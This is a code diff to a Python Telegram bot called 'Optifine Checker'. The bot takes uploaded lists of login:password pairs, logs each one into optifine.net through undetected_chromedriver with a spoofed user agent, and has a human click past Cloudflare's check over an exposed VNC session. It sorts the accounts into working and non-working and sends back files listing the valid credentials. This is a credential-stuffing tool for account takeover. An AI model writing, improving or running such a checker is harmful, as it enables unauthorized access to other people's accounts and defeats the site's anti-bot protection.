@@ -6,6 +6,7 @@ import aiofiles
 import time
 import random
 import subprocess
+import json
 from datetime import datetime
 from typing import Dict, List, Tuple
 
@@ -67,7 +68,7 @@ class OptifineChecker:
                 result = subprocess.run(['xdpyinfo', '-display', ':99'], 
                                       capture_output=True, timeout=2)
                 if result.returncode == 0:
-                    logger.info("✅ Xvfb готов")
+                    logger.info(f"✅ Xvfb готов (попытка {i+1})")
                     return True
             except:
                 pass
@@ -78,6 +79,7 @@ class OptifineChecker:
     def init_driver(self):
         """Инициализация драйвера"""
         try:
+            logger.info("🔍 Проверка Xvfb...")
             if not self.wait_for_xvfb():
                 logger.error("❌ Xvfb не запустился")
                 return False
@@ -88,7 +90,7 @@ class OptifineChecker:
                 chrome_version_output = subprocess.check_output(['google-chrome', '--version']).decode().strip()
                 chrome_version = chrome_version_output.split(' ')[-1].split('.')[0]
                 logger.info(f"✅ Обнаружена версия Chrome: {chrome_version}")
-            except:
+            except Exception as e:
                 chrome_version = 145
                 logger.warning(f"⚠️ Использую версию по умолчанию: {chrome_version}")
             
@@ -103,6 +105,9 @@ class OptifineChecker:
             options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36')
             options.add_argument('--ignore-certificate-errors')
             options.add_argument('--ignore-ssl-errors')
+            options.add_argument('--disable-gpu-sandbox')
+            options.add_argument('--disable-software-rasterizer')
+            options.add_argument('--disable-features=VizDisplayCompositor')
             
             logger.info(f"🚀 Запускаю undetected_chromedriver...")
             
@@ -114,6 +119,14 @@ class OptifineChecker:
             
             self.driver.set_page_load_timeout(60)
             self.driver.implicitly_wait(10)
+            
+            # Проверка что браузер работает
+            self.driver.get("about:blank")
+            time.sleep(2)
+            
+            # Тестовый скриншот
+            self.driver.save_screenshot('/app/debug/test_screenshot.png')
+            logger.info("📸 Тестовый скриншот сохранен")
             
             logger.info("✅ Драйвер успешно инициализирован")
             return True
@@ -153,23 +166,47 @@ class OptifineChecker:
         try:
             session_id = f"{update.effective_user.id}_{int(time.time())}"
             
-            # Получаем IP адрес
-            public_ip = None
-            try:
-                result = subprocess.run(['curl', '-s', 'ifconfig.me'], 
-                                      capture_output=True, text=True, timeout=5)
-                public_ip = result.stdout.strip()
-            except:
-                pass
-            
-            # Получаем Railway URL (если есть)
+            # Получаем Railway URL
             railway_url = None
-            try:
-                railway_host = os.environ.get('RAILWAY_PUBLIC_DOMAIN')
-                if railway_host:
-                    railway_url = f"{railway_host}:5900"
-            except:
-                pass
+            vnc_address = None
+            
+            # Способ 1: Через переменные окружения
+            railway_host = os.environ.get('RAILWAY_PUBLIC_DOMAIN')
+            if railway_host:
+                vnc_address = f"{railway_host}:5900"
+                logger.info(f"✅ Railway URL из переменных: {vnc_address}")
+            
+            # Способ 2: Через метаданные Railway
+            if not vnc_address:
+                try:
+                    result = subprocess.run(['curl', '-s', 'http://metadata.railway.internal/'], 
+                                          capture_output=True, text=True, timeout=5)
+                    if result.returncode == 0:
+                        data = json.loads(result.stdout)
+                        hostname = data.get('hostname')
+                        if hostname:
+                            vnc_address = f"{hostname}.railway.app:5900"
+                            logger.info(f"✅ Railway URL из метаданных: {vnc_address}")
+                except Exception as e:
+                    logger.error(f"❌ Ошибка получения метаданных: {e}")
+            
+            # Способ 3: Через файл с IP
+            if not vnc_address and os.path.exists('/app/vnc_address.txt'):
+                with open('/app/vnc_address.txt', 'r') as f:
+                    vnc_address = f.read().strip()
+                logger.info(f"✅ VNC адрес из файла: {vnc_address}")
+            
+            # Способ 4: Просто IP
+            if not vnc_address:
+                try:
+                    result = subprocess.run(['curl', '-s', 'ifconfig.me'], 
+                                          capture_output=True, text=True, timeout=5)
+                    public_ip = result.stdout.strip()
+                    if public_ip:
+                        vnc_address = f"{public_ip}:5900"
+                        logger.info(f"✅ Публичный IP: {vnc_address}")
+                except:
+                    pass
             
             keyboard = [
                 [InlineKeyboardButton("✅ Я нажал галочку", callback_data=f"vnc_done_{session_id}")],
@@ -178,34 +215,24 @@ class OptifineChecker:
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             
-            # Формируем инструкцию
-            if railway_url:
+            if vnc_address:
                 instruction = (
-                    f"🖥️ **ПОДКЛЮЧЕНИЕ К БРАУЗЕРУ**\n\n"
+                    f"🖥️ **VNC ДОСТУП К БРАУЗЕРУ**\n\n"
                     f"🔗 **АДРЕС ДЛЯ ПОДКЛЮЧЕНИЯ:**\n"
-                    f"`{railway_url}`\n\n"
-                    f"📱 **НА ТЕЛЕФОНЕ:**\n"
+                    f"`{vnc_address}`\n\n"
+                    f"📱 **НА ТЕЛЕФОНЕ (VNC Viewer):**\n"
                     f"1. Скачай **VNC Viewer** из магазина приложений\n"
-                    f"2. Нажми + и введи адрес выше\n"
+                    f"2. Нажми **+** → Введи адрес выше\n"
+                    f"3. Нажми **Connect**\n\n"
+                    f"💻 **НА КОМПЬЮТЕРЕ:**\n"
+                    f"1. Скачай **RealVNC Viewer**\n"
+                    f"2. Введи адрес: `{vnc_address}`\n"
                     f"3. Нажми Connect\n\n"
                     f"✅ **ЧТО ДЕЛАТЬ:**\n"
-                    f"• Нажми галочку в браузере\n"
-                    f"• Вернись и нажми кнопку\n\n"
-                    f"⏳ **Жду 5 минут...**"
-                )
-            elif public_ip:
-                instruction = (
-                    f"🖥️ **ПОДКЛЮЧЕНИЕ К БРАУЗЕРУ**\n\n"
-                    f"🔗 **АДРЕС ДЛЯ ПОДКЛЮЧЕНИЯ:**\n"
-                    f"`{public_ip}:5900`\n\n"
-                    f"⚠️ **Важно:** Убедись что порт 5900 открыт в Railway:\n"
-                    f"Settings → Networking → Add Port 5900\n\n"
-                    f"📱 **Инструкция в VNC Viewer:**\n"
-                    f"1. Введи адрес: `{public_ip}:5900`\n"
-                    f"2. Нажми Connect\n\n"
-                    f"✅ **ДЕЙСТВИЯ:**\n"
-                    f"• Нажми галочку в браузере\n"
-                    f"• Вернись и нажми кнопку"
+                    f"• Ты увидишь рабочий стол с браузером\n"
+                    f"• На странице **optifine.net/login** нажми галочку\n"
+                    f"• После этого вернись и нажми кнопку ниже\n\n"
+                    f"⏳ **Время ожидания: 5 минут**"
                 )
             else:
                 instruction = (
@@ -224,7 +251,13 @@ class OptifineChecker:
             await update.message.reply_text(instruction, reply_markup=reply_markup)
             
             # Открываем страницу
+            logger.info("🌐 Открываю страницу Optifine...")
             self.driver.get("https://optifine.net/login")
+            time.sleep(5)
+            
+            # Сохраняем скриншот
+            self.driver.save_screenshot('/app/debug/login_page.png')
+            logger.info("📸 Скриншот страницы сохранен")
             
             # Сохраняем сессию
             active_sessions[session_id] = {
@@ -268,9 +301,14 @@ class OptifineChecker:
                 session['checker'].cloudflare_passed = True
                 await query.edit_message_text("✅ **Cloudflare пройден!** Продолжаю проверку...")
             else:
+                # Делаем новый скриншот
+                session['checker'].driver.save_screenshot('/app/debug/cloudflare_still_active.png')
                 await query.edit_message_text(
                     "❌ **Cloudflare все еще активен**\n\n"
-                    "Посмотри в VNC и нажми галочку"
+                    "Посмотри в VNC:\n"
+                    "• Видишь ли страницу с галочкой?\n"
+                    "• Нажми на галочку\n"
+                    "• Попробуй еще раз"
                 )
         
         elif action == 'status':
@@ -278,7 +316,7 @@ class OptifineChecker:
                 session['checker'].cloudflare_passed = True
                 await query.edit_message_text("✅ **Cloudflare пройден!**")
             else:
-                await query.edit_message_text("⏳ **Cloudflare еще активен**")
+                await query.edit_message_text("⏳ **Cloudflare еще активен**\n\nЖду пока нажмешь галочку...")
         
         elif action == 'cancel':
             await query.edit_message_text("❌ Операция отменена")
@@ -298,7 +336,7 @@ class OptifineChecker:
             
             while time.time() - start_time < timeout:
                 if self.cloudflare_passed or self.check_cloudflare_status():
-                    logger.info("✅ Cloudflare пройден")
+                    logger.info("✅ Cloudflare пройден, начинаю проверку")
                     break
                 await asyncio.sleep(2)
             
@@ -357,10 +395,17 @@ class OptifineChecker:
             
             # Проверка результата
             current_url = self.driver.current_url
+            page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
+            
             if 'downloads' in current_url or 'profile' in current_url:
+                logger.info(f"✅ РАБОЧИЙ АККАУНТ: {login[:20]}")
                 return {'login': login, 'password': password, 'status': 'valid'}
-            else:
+            elif 'invalid' in page_text or 'incorrect' in page_text:
+                logger.info(f"❌ НЕРАБОЧИЙ: {login[:20]}")
                 return {'login': login, 'status': 'invalid', 'error': 'Неверный логин/пароль'}
+            else:
+                logger.info(f"⚠️ НЕОПРЕДЕЛЕННЫЙ: {login[:20]}")
+                return {'login': login, 'status': 'invalid', 'error': 'Неопределенный результат'}
             
         except Exception as e:
             logger.error(f"❌ Ошибка: {e}")
@@ -383,13 +428,27 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ **Нет доступа**")
         return
     
+    uptime = datetime.now() - bot_stats['start_time']
+    hours = int(uptime.seconds // 3600)
+    minutes = int((uptime.seconds // 60) % 60)
+    
+    keyboard = [
+        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
+        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
+    ]
+    
     await update.message.reply_text(
-        "👋 **Optifine Checker с VNC доступом**\n\n"
-        "📥 **Отправь .txt файл** с аккаунтами\n"
-        "Формат: логин:пароль (каждый с новой строки)\n\n"
-        "📌 **Пример:**\n"
-        "`user@mail.com:password123`\n\n"
-        "🔧 **Для админов:** /debug"
+        f"👋 **Optifine Checker с VNC доступом**\n\n"
+        f"📥 **Отправь .txt файл** с аккаунтами\n"
+        f"Формат: логин:пароль (каждый с новой строки)\n\n"
+        f"📌 **Пример:**\n"
+        f"`user@mail.com:password123`\n\n"
+        f"📊 **Статистика:**\n"
+        f"• Проверено: {bot_stats['total']}\n"
+        f"• Найдено рабочих: {bot_stats['valid']}\n\n"
+        f"🔧 **Для админов:** /debug\n"
+        f"⏱ **Аптайм:** {hours}ч {minutes}мин",
+        reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
 async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -454,7 +513,7 @@ async def process_file(file_path, update, context):
         
         # Инициализация
         if not checker.init_driver():
-            await msg.edit_text("❌ **Ошибка инициализации**")
+            await msg.edit_text("❌ **Ошибка инициализации**\n\nПроверь логи через /debug")
             return
         
         # Настройка VNC
@@ -504,11 +563,25 @@ async def process_file(file_path, update, context):
                 )
             os.remove(valid_file)
         
+        if results['invalid']:
+            invalid_file = f"❌_НЕРАБОЧИЕ_{len(results['invalid'])}шт_{timestamp}.txt"
+            async with aiofiles.open(invalid_file, 'w') as f:
+                for acc in results['invalid']:
+                    await f.write(f"{acc['login']}:{acc['password']}\n")
+            with open(invalid_file, 'rb') as f:
+                await update.message.reply_document(
+                    document=f,
+                    filename=invalid_file,
+                    caption=f"❌ **Нерабочих: {len(results['invalid'])}**"
+                )
+            os.remove(invalid_file)
+        
         await update.message.reply_text(
             f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
-            f"📊 Всего: {total}\n"
-            f"✅ Рабочих: {len(results['valid'])}\n"
-            f"❌ Нерабочих: {len(results['invalid'])}"
+            f"📊 **Статистика:**\n"
+            f"• Всего: {total}\n"
+            f"• ✅ Рабочих: {len(results['valid'])}\n"
+            f"• ❌ Нерабочих: {len(results['invalid'])}"
         )
         
     except Exception as e:
@@ -530,6 +603,10 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ **Нужен .txt файл**")
         return
     
+    if doc.file_size > 10 * 1024 * 1024:
+        await update.message.reply_text("❌ **Файл слишком большой (>10MB)**")
+        return
+    
     try:
         file = await context.bot.get_file(doc.file_id)
         path = f"temp_{update.effective_user.id}_{doc.file_name}"
@@ -541,13 +618,46 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Обработка кнопок"""
-    checker = OptifineChecker()
-    await checker.handle_callback(update, context)
+    query = update.callback_query
+    
+    if query.data and query.data.startswith('vnc_'):
+        checker = OptifineChecker()
+        await checker.handle_callback(update, context)
+        return
+    
+    await query.answer()
+    
+    if query.data == 'stats':
+        uptime = datetime.now() - bot_stats['start_time']
+        hours = int(uptime.seconds // 3600)
+        minutes = int((uptime.seconds // 60) % 60)
+        
+        await query.edit_message_text(
+            f"📊 **СТАТИСТИКА**\n\n"
+            f"Всего проверено: {bot_stats['total']}\n"
+            f"✅ Рабочих: {bot_stats['valid']}\n"
+            f"❌ Нерабочих: {bot_stats['invalid']}\n\n"
+            f"⏱ Аптайм: {hours}ч {minutes}мин"
+        )
+    
+    elif query.data == 'help':
+        await query.edit_message_text(
+            "❓ **ПОМОЩЬ**\n\n"
+            "1. Создай .txt файл\n"
+            "2. В каждой строке: логин:пароль\n"
+            "3. Отправь файл боту\n"
+            "4. Подключись к VNC по полученному адресу\n"
+            "5. Нажми галочку в браузере\n"
+            "6. Нажми кнопку подтверждения"
+        )
 
 def main():
     """Запуск"""
     print("=" * 50)
     print("🚀 ЗАПУСК OPTIFINE CHECKER (VNC РЕЖИМ)")
+    print("=" * 50)
+    print(f"📁 Директория отладки: /app/debug")
+    print(f"👑 Admin IDs: {ADMIN_IDS}")
     print("=" * 50)
     
     app = Application.builder().token(TOKEN).build()
